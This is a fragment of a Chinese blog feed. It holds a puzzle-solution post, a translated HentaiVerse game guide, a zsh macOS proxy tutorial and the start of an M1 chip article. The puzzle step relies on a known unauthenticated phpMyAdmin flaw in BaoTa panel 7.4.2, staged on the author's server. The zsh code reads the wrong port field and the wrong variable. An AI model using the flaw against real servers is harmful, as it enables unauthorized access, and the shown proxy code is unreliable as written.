('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy 